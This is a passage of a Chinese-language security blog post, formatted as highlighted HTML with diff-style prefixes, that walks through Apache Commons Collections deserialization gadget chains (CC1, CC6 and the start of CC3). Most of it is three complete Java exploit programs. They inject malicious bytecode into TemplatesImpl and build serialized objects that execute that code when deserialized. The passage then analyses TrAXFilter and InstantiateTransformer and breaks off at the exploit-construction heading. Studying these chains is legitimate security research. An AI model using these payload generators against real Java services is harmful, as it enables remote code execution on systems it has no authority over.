+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>unserialize</span>(String filename) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(filename));
+</span></span><span style=display:flex><span>        ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl();
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> TemplatesImpl<span style=color:#f92672>&gt;</span> templatesClass <span style=color:#f92672>=</span> templates.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field nameField <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_name&#34;</span>);
+</span></span><span style=display:flex><span>        nameField.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        nameField.<span style=color:#a6e22e>set</span>(templates,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field bytecodes <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_bytecodes&#34;</span>);
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evil <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> code<span style=color:#f92672>=</span>{evil};
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>set</span>(templates,code);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field tfactory <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_tfactory&#34;</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>set</span>(templates,<span style=color:#66d9ef>new</span> TransformerFactoryImpl());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//templates.newTransformer();</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(templates),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;newTransformer&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>,<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>)
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//chainedTransformer.transform(1);</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> map <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        map.<span style=color:#a6e22e>put</span>(<span style=color:#e6db74>&#34;value&#34;</span>,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Map transformedMap <span style=color:#f92672>=</span> TransformedMap.<span style=color:#a6e22e>decorate</span>(map, <span style=color:#66d9ef>null</span>, chainedTransformer);
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?&gt;</span> aih <span style=color:#f92672>=</span> Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
+</span></span><span style=display:flex><span>        Constructor<span style=color:#f92672>&lt;?&gt;</span> aihConstructor <span style=color:#f92672>=</span> aih.<span style=color:#a6e22e>getDeclaredConstructor</span>(Class.<span style=color:#a6e22e>class</span>, Map.<span style=color:#a6e22e>class</span>);
+</span></span><span style=display:flex><span>        aihConstructor.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        Object o <span style=color:#f92672>=</span> aihConstructor.<span style=color:#a6e22e>newInstance</span>(Retention.<span style=color:#a6e22e>class</span>, transformedMap);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        serialize(o);
+</span></span><span style=display:flex><span>        unserialize(<span style=color:#e6db74>&#34;ser.bin&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>然后是 yso 版本的 TemplatesImpl 的实现方式。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.annotation.Retention;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Constructor;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.InvocationHandler;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Proxy;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>serialize</span>(Object obj) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;ser.bin&#34;</span>));
+</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(obj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>unserialize</span>(String filename) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(filename));
+</span></span><span style=display:flex><span>        ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl();
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> TemplatesImpl<span style=color:#f92672>&gt;</span> templatesClass <span style=color:#f92672>=</span> templates.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field nameField <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_name&#34;</span>);
+</span></span><span style=display:flex><span>        nameField.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        nameField.<span style=color:#a6e22e>set</span>(templates,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field bytecodes <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_bytecodes&#34;</span>);
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evil <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> code<span style=color:#f92672>=</span>{evil};
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>set</span>(templates,code);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field tfactory <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_tfactory&#34;</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>set</span>(templates,<span style=color:#66d9ef>new</span> TransformerFactoryImpl());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//templates.newTransformer();</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(templates),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;newTransformer&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>,<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>)
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//chainedTransformer.transform(1);</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> map <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        Map lazyMap <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>decorate</span>(map, chainedTransformer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?&gt;</span> aih <span style=color:#f92672>=</span> Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
+</span></span><span style=display:flex><span>        Constructor<span style=color:#f92672>&lt;?&gt;</span> aihConstructor <span style=color:#f92672>=</span> aih.<span style=color:#a6e22e>getDeclaredConstructor</span>(Class.<span style=color:#a6e22e>class</span>, Map.<span style=color:#a6e22e>class</span>);
+</span></span><span style=display:flex><span>        aihConstructor.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        InvocationHandler invocationHandler <span style=color:#f92672>=</span> (InvocationHandler) aihConstructor.<span style=color:#a6e22e>newInstance</span>(Retention.<span style=color:#a6e22e>class</span>, lazyMap);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Map proxyMap <span style=color:#f92672>=</span> (Map) Proxy.<span style=color:#a6e22e>newProxyInstance</span>(ClassLoader.<span style=color:#a6e22e>getSystemClassLoader</span>(), <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Map.<span style=color:#a6e22e>class</span>}, invocationHandler);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        invocationHandler <span style=color:#f92672>=</span> (InvocationHandler) aihConstructor.<span style=color:#a6e22e>newInstance</span>(Retention.<span style=color:#a6e22e>class</span>, proxyMap);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        serialize(invocationHandler);
+</span></span><span style=display:flex><span>        unserialize(<span style=color:#e6db74>&#34;ser.bin&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=cc6-链的-templatesimpl-的实现方式>CC6 链的 TemplatesImpl 的实现方式
+<a class=anchor href=#cc6-%e9%93%be%e7%9a%84-templatesimpl-%e7%9a%84%e5%ae%9e%e7%8e%b0%e6%96%b9%e5%bc%8f>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CC6test</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>serialize</span>(Object obj) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;ser.bin&#34;</span>));
+</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(obj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>unserialize</span>(String filename) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(filename));
+</span></span><span style=display:flex><span>        ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl();
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> TemplatesImpl<span style=color:#f92672>&gt;</span> templatesClass <span style=color:#f92672>=</span> templates.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field nameField <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_name&#34;</span>);
+</span></span><span style=display:flex><span>        nameField.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        nameField.<span style=color:#a6e22e>set</span>(templates,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field bytecodes <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_bytecodes&#34;</span>);
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evil <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> code<span style=color:#f92672>=</span>{evil};
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>set</span>(templates,code);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field tfactory <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_tfactory&#34;</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>set</span>(templates,<span style=color:#66d9ef>new</span> TransformerFactoryImpl());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//templates.newTransformer();</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(templates),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;newTransformer&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>,<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>)
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> map <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        Map lazyMap <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>decorate</span>(map, <span style=color:#66d9ef>new</span> ConstantTransformer(1));
+</span></span><span style=display:flex><span>        TiedMapEntry tiedMapEntry <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TiedMapEntry(lazyMap, <span style=color:#e6db74>&#34;key&#34;</span>);
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> hashMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        hashMap.<span style=color:#a6e22e>put</span>(tiedMapEntry,<span style=color:#e6db74>&#34;value&#34;</span>);
+</span></span><span style=display:flex><span>        lazyMap.<span style=color:#a6e22e>remove</span>(<span style=color:#e6db74>&#34;key&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;</span>LazyMap<span style=color:#f92672>&gt;</span> lazyMapClass <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>class</span>;
+</span></span><span style=display:flex><span>        Field factory <span style=color:#f92672>=</span> lazyMapClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;factory&#34;</span>);
+</span></span><span style=display:flex><span>        factory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        factory.<span style=color:#a6e22e>set</span>(lazyMap,chainedTransformer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        serialize(hashMap);
+</span></span><span style=display:flex><span>        unserialize(<span style=color:#e6db74>&#34;ser.bin&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>可以顺便回顾一下 CC1 和 CC6 的链子。</p><h2 id=cc3-链>CC3 链
+<a class=anchor href=#cc3-%e9%93%be>#</a></h2><h3 id=cc3-链分析>CC3 链分析
+<a class=anchor href=#cc3-%e9%93%be%e5%88%86%e6%9e%90>#</a></h3><p>上面分析过，只要能调用到<code>TemplatesImpl</code>的<code>newTransformer()</code>方法，就可以实现命令执行，接下来找一下谁调用了<code>newTransformer()</code>方法。</p><p>在所有的查找结果中，<code>TrAXFilter</code>最好使。</p><p>虽然这个类没有实现<code>Serializable</code>接口，不能序列化，但是构造函数是有利用面的。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#a6e22e>TrAXFilter</span>(Templates templates)  <span style=color:#66d9ef>throws</span>
+</span></span><span style=display:flex><span>        TransformerConfigurationException
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        _templates <span style=color:#f92672>=</span> templates;
+</span></span><span style=display:flex><span>        _transformer <span style=color:#f92672>=</span> (TransformerImpl) templates.<span style=color:#a6e22e>newTransformer</span>();
+</span></span><span style=display:flex><span>        _transformerHandler <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TransformerHandlerImpl(_transformer);
+</span></span><span style=display:flex><span>        _useServicesMechanism <span style=color:#f92672>=</span> _transformer.<span style=color:#a6e22e>useServicesMechnism</span>();
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>CC3 中没有调用<code>InvokerTransformer</code>，而是调用了另一个类<code>InstantiateTransformer</code>。</p><p>这个类是用来初始化<code>Transformer</code>的，我们看一下这个类下的<code>transform</code>方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>transform</span>(Object input) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (input <span style=color:#66d9ef>instanceof</span> Class <span style=color:#f92672>==</span> <span style=color:#66d9ef>false</span>) {
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> FunctorException(
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;InstantiateTransformer: Input object was not an instanceof Class, it was a &#34;</span>
+</span></span><span style=display:flex><span>                        <span style=color:#f92672>+</span> (input <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;null object&#34;</span> : input.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getName</span>()));
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>            Constructor con <span style=color:#f92672>=</span> ((Class) input).<span style=color:#a6e22e>getConstructor</span>(iParamTypes);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> con.<span style=color:#a6e22e>newInstance</span>(iArgs);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (NoSuchMethodException ex) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> FunctorException(<span style=color:#e6db74>&#34;InstantiateTransformer: The constructor must exist and be public &#34;</span>);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (InstantiationException ex) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> FunctorException(<span style=color:#e6db74>&#34;InstantiateTransformer: InstantiationException&#34;</span>, ex);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (IllegalAccessException ex) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> FunctorException(<span style=color:#e6db74>&#34;InstantiateTransformer: Constructor must be public&#34;</span>, ex);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (InvocationTargetException ex) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> FunctorException(<span style=color:#e6db74>&#34;InstantiateTransformer: Constructor threw an exception&#34;</span>, ex);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><h3 id=构造-exp>构造 EXP
